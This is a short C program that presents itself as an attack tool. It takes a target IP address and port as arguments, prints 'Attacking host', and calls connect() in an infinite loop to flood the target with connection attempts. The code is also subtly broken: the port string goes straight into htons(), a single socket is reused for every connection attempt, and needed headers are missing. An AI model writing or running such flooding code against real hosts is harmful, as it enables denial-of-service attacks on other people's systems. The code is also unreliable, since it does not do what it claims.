#include <stdio.h>
#include <netdb.h>

int main(int argc, char *argv[]){
	struct sockaddr_in target;
	int conn;
	int mysocket = socket(AF_INET, SOCK_STREAM, 0);//ip protocol
	
	target.sin_family = AF_INET;
	target.sin_port = htons(argv[2]);
	target.sin_addr.s_addr = inet_addr(argv[1]);

//	conn = connect(socket, (struct socketaddr *)&target, sizeof target);
	printf("Attacking host %s on port %s \n", argv[1], argv[2]);
	while(1){
		conn = connect(mysocket, (struct sockaddr *)&target, sizeof target);		
	}

}
